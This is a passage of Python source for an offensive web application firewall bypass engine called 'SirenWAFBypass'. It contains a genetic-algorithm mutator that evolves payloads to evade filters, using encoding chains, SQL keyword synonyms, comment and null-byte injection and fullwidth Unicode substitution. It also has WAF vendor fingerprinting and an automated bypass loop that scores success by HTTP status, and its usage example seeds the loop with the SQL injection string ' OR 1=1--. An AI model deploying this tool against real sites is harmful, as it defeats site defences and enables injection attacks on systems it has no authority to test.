        generations: int = 10,
        population_size: int = POPULATION_SIZE,
        fitness_func: Optional[Callable[[str], float]] = None,
    ) -> List[str]:
        """
        Evolve a payload over multiple generations using genetic algorithm.

        Args:
            payload: Seed payload.
            generations: Number of generations to evolve.
            population_size: Size of each generation.
            fitness_func: Callable scoring payload fitness (higher = better).
                          If None, uses diversity-based scoring.

        Returns:
            List of evolved payloads (best from final generation).
        """
        with self._lock:
            generations = min(generations, MAX_MUTATION_GENERATIONS)
            if fitness_func is None:
                fitness_func = self._default_fitness

            # Initialize population with mutations of the seed
            population: List[str] = [payload]
            for _ in range(population_size - 1):
                mutant = self.mutate(payload)
                population.append(mutant)

            best_overall: List[Tuple[float, str]] = []

            for gen in range(generations):
                # Score fitness
                scored: List[Tuple[float, str]] = []
                for individual in population:
                    try:
                        score = fitness_func(individual)
                    except Exception:
                        score = 0.0
                    scored.append((score, individual))

                # Sort by fitness (descending)
                scored.sort(key=lambda x: x[0], reverse=True)

                # Track best
                best_overall.extend(scored[:ELITE_COUNT])

                # Elitism — keep top individuals
                next_gen: List[str] = [s[1] for s in scored[:ELITE_COUNT]]

                # Fill rest with crossover + mutation
                while len(next_gen) < population_size:
                    # Tournament selection
                    p1 = self._tournament_select(scored)
                    p2 = self._tournament_select(scored)

                    # Crossover
                    if self._rng.random() < CROSSOVER_RATE:
                        c1, c2 = self.crossover(p1, p2)
                    else:
                        c1, c2 = p1, p2

                    # Mutation
                    if self._rng.random() < MUTATION_RATE:
                        c1 = self.mutate(c1)
                    if self._rng.random() < MUTATION_RATE:
                        c2 = self.mutate(c2)

                    next_gen.append(c1)
                    if len(next_gen) < population_size:
                        next_gen.append(c2)

                population = next_gen

            # Return best unique payloads
            best_overall.sort(key=lambda x: x[0], reverse=True)
            seen: Set[str] = set()
            results: List[str] = []
            for _, p in best_overall:
                if p not in seen:
                    seen.add(p)
                    results.append(p)
                    if len(results) >= population_size:
                        break

            self._mutation_history.append({
                "seed": payload,
                "generations": generations,
                "population_size": population_size,
                "results_count": len(results),
                "timestamp": time.time(),
            })

            logger.info(
                "Evolved payload over %d generations -> %d unique variants",
                generations, len(results),
            )
            return results

    def _tournament_select(
        self, scored: List[Tuple[float, str]], k: int = 3
    ) -> str:
        """Tournament selection: pick k random, return the fittest."""
        contestants = self._rng.sample(
            scored, min(k, len(scored))
        )
        return max(contestants, key=lambda x: x[0])[1]

    def _default_fitness(self, payload: str) -> float:
        """Default fitness: diversity from original + obfuscation level."""
        score = 0.0
        # Length diversity (longer = more obfuscated, but not too long)
        if 10 < len(payload) < MAX_PAYLOAD_SIZE:
            score += 0.3
        # Contains encoding artifacts
        encoding_markers = ["%", "\\u", "&#", "/*", "*/", "\\x", "CHAR("]
        for marker in encoding_markers:
            if marker in payload:
                score += 0.1
        # Doesn't contain raw SQL keywords in original form
        raw_kw_count = 0
        for kw in ["SELECT", "UNION", "INSERT", "DELETE", "DROP"]:
            if kw in payload:
                raw_kw_count += 1
        if raw_kw_count == 0:
            score += 0.3
        return min(1.0, score)

    # ── Mutation Operators ─────────────────────────────────────────────────

    def _mutate_random_encode(self, payload: str) -> str:
        """Apply a random encoding transform."""
        transforms = [
            TransformType.URL_ENCODE,
            TransformType.DOUBLE_URL_ENCODE,
            TransformType.OVERLONG_UTF8,
            TransformType.UNICODE_NORMALIZE,
            TransformType.HTML_DECIMAL,
            TransformType.HTML_HEX,
            TransformType.HEX_ENCODE,
            TransformType.BASE64_ENCODE,
        ]
        chosen = self._rng.choice(transforms)
        return self._transformer.transform(payload, chosen)

    def _mutate_keyword_synonym(self, payload: str) -> str:
        """Replace a SQL keyword with a synonym/alternative."""
        result = payload
        for kw, synonyms in SQL_KEYWORD_SYNONYMS.items():
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            if pattern.search(result):
                replacement = self._rng.choice(synonyms)
                result = pattern.sub(replacement, result, count=1)
                break
        return result

    def _mutate_whitespace_insert(self, payload: str) -> str:
        """Insert random whitespace alternative at a space."""
        ws_chars = ["\t", "\n", "\r", "\x0b", "/**/", "%09", "%0a", "%0d"]
        if " " not in payload:
            return payload
        positions = [i for i, ch in enumerate(payload) if ch == " "]
        if not positions:
            return payload
        pos = self._rng.choice(positions)
        ws = self._rng.choice(ws_chars)
        return payload[:pos] + ws + payload[pos + 1:]

    def _mutate_whitespace_remove(self, payload: str) -> str:
        """Remove a random space."""
        if " " not in payload:
            return payload
        positions = [i for i, ch in enumerate(payload) if ch == " "]
        pos = self._rng.choice(positions)
        return payload[:pos] + payload[pos + 1:]

    def _mutate_comment_insert(self, payload: str) -> str:
        """Insert a comment at a random position."""
        comments = ["/**/", "/*!*/", "/*foo*/", "/**//**/"]
        pos = self._rng.randint(0, len(payload))
        comment = self._rng.choice(comments)
        return payload[:pos] + comment + payload[pos:]

    def _mutate_wrapper_add(self, payload: str) -> str:
        """Wrap a keyword with parentheses or backticks."""
        wrappers = [
            ("`", "`"),
            ("(", ")"),
            ("((", "))"),
            ("[", "]"),
        ]
        for kw in SQL_KEYWORDS:
            pattern = re.compile(r'\b' + re.escape(kw) + r'\b', re.IGNORECASE)
            match = pattern.search(payload)
            if match:
                l, r = self._rng.choice(wrappers)
                word = match.group(0)
                return payload[:match.start()] + l + word + r + payload[match.end():]
        return payload

    def _mutate_charset_mix(self, payload: str) -> str:
        """Replace a random alpha char with fullwidth Unicode variant."""
        if not any(c.isalpha() for c in payload):
            return payload
        alpha_positions = [i for i, ch in enumerate(payload) if ch.isalpha()]
        pos = self._rng.choice(alpha_positions)
        ch = payload[pos]
        code = ord(ch)
        if 0x21 <= code <= 0x7E:
            fullwidth = chr(code + 0xFEE0)
            return payload[:pos] + fullwidth + payload[pos + 1:]
        return payload

    def _mutate_case_flip(self, payload: str) -> str:
        """Flip case of a random alphabetic character."""
        if not any(c.isalpha() for c in payload):
            return payload
        alpha_positions = [i for i, ch in enumerate(payload) if ch.isalpha()]
        pos = self._rng.choice(alpha_positions)
        ch = payload[pos]
        flipped = ch.lower() if ch.isupper() else ch.upper()
        return payload[:pos] + flipped + payload[pos + 1:]

    def _mutate_char_substitute(self, payload: str) -> str:
        """Substitute a character with an encoded equivalent."""
        encode_map = {
            "'": ["%27", "%c0%a7", "\\u0027", "&#39;"],
            '"': ["%22", "%c0%a2", "\\u0022", "&quot;"],
            "<": ["%3C", "%c0%bc", "\\u003c", "&lt;"],
            ">": ["%3E", "%c0%be", "\\u003e", "&gt;"],
            " ": ["%20", "%09", "+", "/**/"],
            "=": ["%3D", "\\u003d", "LIKE"],
            "(": ["%28", "\\u0028"],
            ")": ["%29", "\\u0029"],
        }
        for ch, replacements in encode_map.items():
            pos = payload.find(ch)
            if pos != -1:
                replacement = self._rng.choice(replacements)
                return payload[:pos] + replacement + payload[pos + 1:]
        return payload

    def _mutate_null_inject(self, payload: str) -> str:
        """Inject a null byte at a random position."""
        null_variants = ["%00", "\\0", "\\x00"]
        pos = self._rng.randint(0, len(payload))
        null = self._rng.choice(null_variants)
        return payload[:pos] + null + payload[pos:]

    def _mutate_duplicate_segment(self, payload: str) -> str:
        """Duplicate a random segment of the payload."""
        if len(payload) < 4:
            return payload
        start = self._rng.randint(0, len(payload) - 2)
        end = self._rng.randint(start + 1, min(start + 8, len(payload)))
        segment = payload[start:end]
        return payload[:end] + segment + payload[end:]

    def _mutate_reverse_segment(self, payload: str) -> str:
        """Reverse a small segment within the payload."""
        if len(payload) < 4:
            return payload
        start = self._rng.randint(0, len(payload) - 3)
        end = self._rng.randint(start + 2, min(start + 6, len(payload)))
        segment = payload[start:end]
        return payload[:start] + segment[::-1] + payload[end:]

    def get_mutation_history(self) -> List[Dict[str, Any]]:
        """Return mutation history."""
        with self._lock:
            return list(self._mutation_history)


# ════════════════════════════════════════════════════════════════════════════════
# SIREN WAF BYPASS — Main Orchestrator
# ════════════════════════════════════════════════════════════════════════════════

class SirenWAFBypass:
    """
    Master orchestrator for WAF bypass operations.

    Combines fingerprinting, payload transformation, encoding chaining,
    genetic mutation, and automated bypass testing into a unified engine.

    Usage::

        bypass = SirenWAFBypass()

        # Fingerprint a WAF from response data
        profile = bypass.fingerprint_waf(
            status_code=403,
            headers={"Server": "cloudflare", "cf-ray": "abc"},
            body="Attention Required",
            cookies={"__cfduid": "x"}
        )

        # Transform a payload with specific techniques
        variants = bypass.transform_payload("' OR 1=1--")

        # Auto-bypass cycle
        result = bypass.auto_bypass(
            payload="' OR 1=1--",
            waf_profile=profile
        )

        # Mutate payloads genetically
        mutants = bypass.mutate_payload("' OR 1=1--", generations=10)

        # Generate full report
        report = bypass.generate_report()
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._fingerprinter = WAFFingerprinter()
        self._transformer = PayloadTransformer()
        self._chainer = EncodingChainer()
        self._mutator = PayloadMutator()
        self._results: List[BypassResult] = []
        self._profiles: List[WAFProfile] = []
        self._technique_stats: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"attempts": 0, "successes": 0}
        )
        self._waf_stats: Dict[str, Dict[str, int]] = defaultdict(
            lambda: {"attempts": 0, "successes": 0}
        )
        self._started_at = time.time()
        logger.info("SirenWAFBypass initialized")

    # ── WAF Fingerprinting ─────────────────────────────────────────────────

    def fingerprint_waf(
        self,
        target_url: str = "",
        status_code: int = 0,
        headers: Optional[Dict[str, str]] = None,
        body: str = "",
        cookies: Optional[Dict[str, str]] = None,
    ) -> WAFProfile:
        """
        Fingerprint a WAF from HTTP response data.

        In a real scenario this would send probe requests. Here it analyzes
        response characteristics provided by the caller (or another module
        that handles HTTP).

        Args:
            target_url: URL being tested (metadata).
            status_code: HTTP status code of the response.
            headers: Response headers dict.
            body: Response body text.
            cookies: Response cookies dict.

        Returns:
            WAFProfile with vendor identification and confidence.
        """
        with self._lock:
            profile = self._fingerprinter.fingerprint(
                status_code=status_code,
                headers=headers,
                body=body,
                cookies=cookies,
            )
            self._profiles.append(profile)
            logger.info(
                "WAF fingerprinted for %s: %s (conf=%.2f)",
                target_url or "unknown", profile.vendor_name, profile.confidence,
            )
            return profile

    # ── Payload Transformation ─────────────────────────────────────────────

    def transform_payload(
        self,
        payload: str,
        techniques: Optional[List[TransformType]] = None,
    ) -> List[str]:
        """
        Transform a payload using specified or all techniques.

        Args:
            payload: Original payload string.
            techniques: List of TransformType to apply individually.
                        If None, applies all available techniques.

        Returns:
            List of transformed payload variants.
        """
        with self._lock:
            if techniques is None:
                techniques = self._transformer.get_all_transforms()

            results: List[str] = []
            seen: Set[str] = {payload}
            for tech in techniques:
                transformed = self._transformer.transform(payload, tech)
                if transformed not in seen:
                    seen.add(transformed)
                    results.append(transformed)
            logger.info(
                "Transformed payload into %d variants (from %d techniques)",
                len(results), len(techniques),
            )
            return results

    # ── Auto Bypass ────────────────────────────────────────────────────────

    def auto_bypass(
        self,
        payload: str,
        waf_profile: Optional[WAFProfile] = None,
        test_func: Optional[Callable[[str], Tuple[int, str]]] = None,
        max_attempts: int = MAX_TECHNIQUES_PER_RUN,
    ) -> BypassResult:
        """
        Automatic bypass attempt cycle.

        Tries techniques appropriate for the identified WAF, falling back
        to generic techniques. If test_func is provided, it is called with
        each transformed payload and should return (status_code, body_snippet).
        A 200 status_code is considered a successful bypass.

        Args:
            payload: Original attack payload.
            waf_profile: WAFProfile from fingerprinting (optional).
            test_func: Callable(transformed_payload) -> (status_code, body).
            max_attempts: Maximum number of techniques to try.

        Returns:
            Best BypassResult found.
        """
        with self._lock:
            start_time = time.time()
            waf_name = "generic"
            if waf_profile and waf_profile.vendor != WAFVendor.UNKNOWN:
                waf_name = waf_profile.vendor_name

            # Get techniques for this WAF + generic fallback
            techniques = self.get_techniques_for_waf(waf_name)
            if waf_name != "generic":
                techniques.extend(self.get_techniques_for_waf("generic"))

            best_result = BypassResult(
                original_payload=payload,
                transformed_payload=payload,
                technique_used="none",
                waf_bypassed=False,
            )

            attempts = 0
            for tech in techniques[:max_attempts]:
                attempts += 1
                # Apply the technique's encoding chain
                transformed = payload
                for transform in tech.encoding_chain:
                    transformed = self._transformer.transform(transformed, transform)

                # Track stats
                tech_name = tech.name
                self._technique_stats[tech_name]["attempts"] += 1
                self._waf_stats[waf_name]["attempts"] += 1

                # Test if bypass works
                bypassed = False
                resp_code = 0
                resp_body = ""
                detection = DetectionMethod.STATUS_CODE

                if test_func is not None:
                    try:
                        resp_code, resp_body = test_func(transformed)
                        bypassed = self._evaluate_bypass(resp_code, resp_body)
                        if resp_code == 200:
                            detection = DetectionMethod.STATUS_CODE
                        elif resp_body and payload in resp_body:
                            detection = DetectionMethod.REFLECTION
                            bypassed = True
                    except Exception as exc:
                        logger.warning("Test function failed: %s", exc)
                else:
                    # Without test function, score by technique's historical rate
                    bypassed = False

                result = BypassResult(
                    original_payload=payload,
                    transformed_payload=transformed,
                    technique_used=tech_name,
                    technique_id=tech.technique_id,
                    waf_bypassed=bypassed,
                    response_code=resp_code,
                    response_body_snippet=resp_body[:200] if resp_body else "",
                    detection_method=detection,
                    confidence=tech.success_rate,
                    transform_chain=[t.name for t in tech.encoding_chain],
                    elapsed_time=time.time() - start_time,
                )
                self._results.append(result)

                if bypassed:
                    self._technique_stats[tech_name]["successes"] += 1
                    self._waf_stats[waf_name]["successes"] += 1
                    logger.info(
                        "Bypass SUCCESS: technique=%s, code=%d",
                        tech_name, resp_code,
                    )
                    return result

                # Track best by confidence/success_rate
                if tech.success_rate > best_result.confidence:
                    best_result = result

            best_result.elapsed_time = time.time() - start_time
            logger.info(
                "Auto bypass completed: %d attempts, best=%s",
                attempts, best_result.technique_used,
            )
            return best_result

    def _evaluate_bypass(self, status_code: int, body: str) -> bool:
        """Evaluate whether a response indicates a successful WAF bypass."""
        # Non-block status codes
        if status_code in (200, 201, 301, 302, 304):
            return True
        # WAF block indicators
        block_words = [
            "blocked", "denied", "forbidden", "rejected",
            "not acceptable", "violation", "access denied",
            "request rejected", "web application firewall",
        ]
        body_lower = body.lower()
        for word in block_words:
            if word in body_lower:
                return False
        # 403/406/501 are typically blocks
        if status_code in (403, 406, 501):
            return False
        # If we got a different code without block words, possibly bypassed
        if status_code >= 200 and status_code < 400:
            return True
        return False

    # ── Test All Techniques ────────────────────────────────────────────────

    def test_all_techniques(
        self,
        payload: str,
        waf_profile: Optional[WAFProfile] = None,
        test_func: Optional[Callable[[str], Tuple[int, str]]] = None,
    ) -> List[BypassResult]:
        """
        Test all available techniques against a target.

        Args:
            payload: Original payload.
            waf_profile: Optional WAF profile to prioritize techniques.
            test_func: Callable to test each variant.

        Returns:
            List of BypassResult for each technique tried.
        """
        with self._lock:
            results: List[BypassResult] = []
            all_techniques = self._build_all_techniques()

            for tech in all_techniques:
                transformed = payload
                for transform in tech.encoding_chain:
                    transformed = self._transformer.transform(
                        transformed, transform
                    )

                bypassed = False
                resp_code = 0
                resp_body = ""

                if test_func is not None:
                    try:
                        resp_code, resp_body = test_func(transformed)
                        bypassed = self._evaluate_bypass(resp_code, resp_body)
                    except Exception:
                        pass

                result = BypassResult(
                    original_payload=payload,
                    transformed_payload=transformed,
                    technique_used=tech.name,
                    technique_id=tech.technique_id,
                    waf_bypassed=bypassed,
                    response_code=resp_code,
                    response_body_snippet=resp_body[:200] if resp_body else "",
                    confidence=tech.success_rate,
                    transform_chain=[t.name for t in tech.encoding_chain],
                )
                results.append(result)
                self._results.append(result)

            logger.info("Tested %d techniques", len(results))
            return results

    def _build_all_techniques(self) -> List[BypassTechnique]:
        """Build BypassTechnique objects from all WAF bypass databases."""
        techniques: List[BypassTechnique] = []
        seen_ids: Set[str] = set()
        for waf_name, tech_list in WAF_BYPASS_DB.items():
            for td in tech_list:
                tid = td["id"]
                if tid in seen_ids:
                    continue
                seen_ids.add(tid)
                techniques.append(BypassTechnique(
                    technique_id=tid,
                    name=td["name"],
                    description=f"{td['name']} for {waf_name}",
                    target_waf=waf_name,
                    encoding_chain=td["transforms"],
                    success_rate=td["success_rate"],
                    detection_risk=1.0 - td["success_rate"],
                ))
        return techniques

    # ── Get Techniques for WAF ─────────────────────────────────────────────

    def get_techniques_for_waf(
        self, waf_vendor: str
    ) -> List[BypassTechnique]:
        """
        Get bypass techniques targeted at a specific WAF vendor.

        Args:
            waf_vendor: WAF vendor name (e.g., "cloudflare", "modsecurity").

        Returns:
            List of BypassTechnique objects sorted by success rate.
        """
        vendor_lower = waf_vendor.lower()
        tech_data = WAF_BYPASS_DB.get(vendor_lower, [])
        if not tech_data:
            tech_data = WAF_BYPASS_DB.get("generic", [])

        techniques: List[BypassTechnique] = []
        for td in tech_data:
            techniques.append(BypassTechnique(
                technique_id=td["id"],
                name=td["name"],
                description=f"{td['name']} targeting {waf_vendor}",
                target_waf=waf_vendor,
                encoding_chain=td["transforms"],
                success_rate=td["success_rate"],
                detection_risk=1.0 - td["success_rate"],
                category="waf_bypass",
                tags=[waf_vendor],
            ))

        techniques.sort(key=lambda t: t.success_rate, reverse=True)
        return techniques

    # ── Encoding Chaining ──────────────────────────────────────────────────

    def chain_encodings(
        self, payload: str, chain: List[TransformType]
    ) -> str:
        """
        Chain multiple encoding techniques on a payload.

        Args:
            payload: Original payload.
            chain: Ordered list of TransformType to apply.

        Returns:
            Transformed payload after all chain steps.
        """
        return self._chainer.chain(payload, chain)

    # ── Payload Mutation ───────────────────────────────────────────────────

    def mutate_payload(
        self,
        payload: str,
        generations: int = 10,
        population_size: int = POPULATION_SIZE,
        fitness_func: Optional[Callable[[str], float]] = None,
    ) -> List[str]:
        """
        Genetically mutate a payload over multiple generations.

        Args:
            payload: Seed payload.
            generations: Number of evolution generations.
            population_size: Population per generation.
            fitness_func: Optional fitness scoring function.

        Returns:
            List of evolved payload variants.
        """
        return self._mutator.evolve(
            payload,
            generations=generations,
            population_size=population_size,
            fitness_func=fitness_func,
        )

    # ── Report Generation ──────────────────────────────────────────────────

    def generate_report(self) -> WAFBypassReport:
        """
        Generate a comprehensive WAF bypass report.

        Returns:
            WAFBypassReport with all results and statistics.
        """
        with self._lock:
            now = time.time()
            successful = [r for r in self._results if r.waf_bypassed]
            failed = [r for r in self._results if not r.waf_bypassed]

            bypass_rate = 0.0
            if self._results:
                bypass_rate = len(successful) / len(self._results)

            best_tech = ""
            best_payload = ""
            if successful:
                # Find technique with highest confidence among successes
                best = max(successful, key=lambda r: r.confidence)
                best_tech = best.technique_used
                best_payload = best.transformed_payload

            techniques_used = list({r.technique_used for r in self._results})

            report = WAFBypassReport(
                target_url="",
                waf_profile=self._profiles[-1] if self._profiles else None,
                total_attempts=len(self._results),
                successful_bypasses=len(successful),
                failed_attempts=len(failed),
                bypass_rate=round(bypass_rate, 4),
                results=list(self._results),
                techniques_used=techniques_used,
                best_technique=best_tech,
                best_payload=best_payload,
                statistics=self.get_bypass_statistics(),
                started_at=self._started_at,
                completed_at=now,
                duration=round(now - self._started_at, 3),
            )

            logger.info(
                "Report generated: %d attempts, %d bypasses (%.1f%%)",
                report.total_attempts, report.successful_bypasses,
                report.bypass_rate * 100,
            )
            return report

    # ── Bypass Statistics ──────────────────────────────────────────────────

    def get_bypass_statistics(self) -> Dict[str, Any]:
        """
        Get detailed bypass statistics per technique and per WAF.

        Returns:
            Dict with technique_stats and waf_stats.
        """
        with self._lock:
            tech_stats: Dict[str, Dict[str, Any]] = {}
            for name, stats in self._technique_stats.items():
                attempts = stats["attempts"]
                successes = stats["successes"]
                tech_stats[name] = {
                    "attempts": attempts,
                    "successes": successes,
                    "success_rate": round(
                        successes / attempts if attempts > 0 else 0.0, 4
                    ),
                }

            waf_stats: Dict[str, Dict[str, Any]] = {}
            for name, stats in self._waf_stats.items():
                attempts = stats["attempts"]
                successes = stats["successes"]
                waf_stats[name] = {
                    "attempts": attempts,
                    "successes": successes,
                    "success_rate": round(
                        successes / attempts if attempts > 0 else 0.0, 4
                    ),
                }

            # Per-transform-type aggregation
            transform_usage = self._transformer.get_stats()

            # Chain history
            chain_history_count = len(self._chainer.get_chain_history())

            # Mutation history
            mutation_history_count = len(self._mutator.get_mutation_history())

            return {
                "technique_stats": tech_stats,
                "waf_stats": waf_stats,
                "transform_usage": transform_usage,
                "total_results": len(self._results),
                "total_profiles": len(self._profiles),
                "chain_operations": chain_history_count,
                "mutation_operations": mutation_history_count,
                "unique_techniques": len(tech_stats),
                "unique_wafs_tested": len(waf_stats),
            }

    # ── Utility Methods ────────────────────────────────────────────────────

    def get_all_waf_vendors(self) -> List[str]:
        """Return all supported WAF vendor names."""
        return list(WAF_SIGNATURES.keys())

    def get_all_transform_types(self) -> List[str]:
        """Return all available transform type names."""
        return [t.name for t in TransformType]

    def get_predefined_chains(self) -> List[str]:
        """Return names of predefined encoding chains."""
        return self._chainer.get_predefined_chain_names()

    def reset(self) -> None:
        """Reset all internal state."""
        with self._lock:
            self._results.clear()
            self._profiles.clear()
            self._technique_stats.clear()
            self._waf_stats.clear()
            self._started_at = time.time()
            logger.info("SirenWAFBypass state reset")

    def export_results_json(self) -> str:
        """Export all results as JSON string."""
        with self._lock:
            report = self.generate_report()
            return json.dumps(report.to_dict(), indent=2, default=str)
